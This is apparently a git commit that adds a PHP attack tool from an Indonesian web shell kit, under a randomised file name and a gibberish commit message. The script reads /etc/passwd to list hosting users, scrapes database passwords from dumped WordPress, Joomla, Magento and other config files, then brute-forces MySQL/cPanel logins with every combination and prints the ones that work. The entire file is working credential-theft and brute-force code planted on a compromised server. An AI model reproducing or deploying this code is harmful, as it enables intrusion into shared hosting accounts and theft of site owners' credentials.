adea2cfe74fe921fc8f3a0f354ff80a4739ba4ce
antoniola <renata.cantiek@gmail.com>
2016-11-17 09:23:20 +0700

    fsafdzvfxgxcbvb
    35f1x652zc5zclzxjcnkxjcxcxvc

---
+++ ASDAFZSFZD34509wtsjfosdkfjidsfnkdsjfkdnjfd.php
@@ -0,0 +1,84 @@
+<?php
+
+	if($_POST['crack']) {
+		$usercp = explode("\r\n", $_POST['user_cp']);
+		$passcp = explode("\r\n", $_POST['pass_cp']);
+		$i = 0;
+		foreach($usercp as $ucp) {
+			foreach($passcp as $pcp) {
+				if(@mysql_connect('localhost', $ucp, $pcp)) {
+					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
+					} else {
+						$_SESSION[$ucp] = "1";
+						$_SESSION[$pcp] = "1";
+						if($ucp == '' || $pcp == '') {
+							
+						} else {
+							$i++;
+							echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
+						}
+					}
+				}
+			}
+		}
+		if($i == 0) {
+		} else {
+			echo "<br>Sukses Nloco ".$i." Cpanel by <font color=lime>Croot Coder.</font>";
+		}
+	} else {
+		echo "<center>
+		<form method='post'>
+		USER: <br>
+		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
+		$_usercp = fopen("/etc/passwd","r");
+		while($getu = fgets($_usercp)) {
+			if($getu == '' || !$_usercp) {
+				echo "<font color=red>Can't read /etc/passwd</font>";
+			} else {
+				preg_match_all("/(.*?):x:/", $getu, $u);
+				foreach($u[1] as $user_cp) {
+						if(is_dir("/home/$user_cp/public_html")) {
+							echo "$user_cp\n";
+					}
+				}
+			}
+		}
+		echo "</textarea><br>
+		PASS: <br>
+		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
+		function cp_pass($dir) {
+			$pass = "";
+			$dira = scandir($dir);
+			foreach($dira as $dirb) {
+				if(!is_file("$dir/$dirb")) continue;
+				$ambil = file_get_contents("$dir/$dirb");
+				if(preg_match("/WordPress/", $ambil)) {
+					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
+				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
+					$pass .= ambilkata($ambil,"password = '","'")."\n";
+				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
+					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
+				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
+					$pass .= ambilkata($ambil,'password = "','"')."\n";
+				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
+					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
+				} elseif(preg_match("/client/", $ambil)) {
+					preg_match("/password=(.*)/", $ambil, $pass1);
+					if(preg_match('/"/', $pass1[1])) {
+						$pass1[1] = str_replace('"', "", $pass1[1]);
+						$pass .= $pass1[1]."\n";
+					}
+				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
+					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
+				}
+			}
+			echo $pass;
+		}
+		$cp_pass = cp_pass($dir);
+		echo $cp_pass;
+		echo "</textarea><br>
+		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
+		</form><br>
+		<span><font color=lime><p class='blink'>Harus Di Lokasi Folder /Croot-Config/ </p></font></span><br></center>";
+	}
+?>
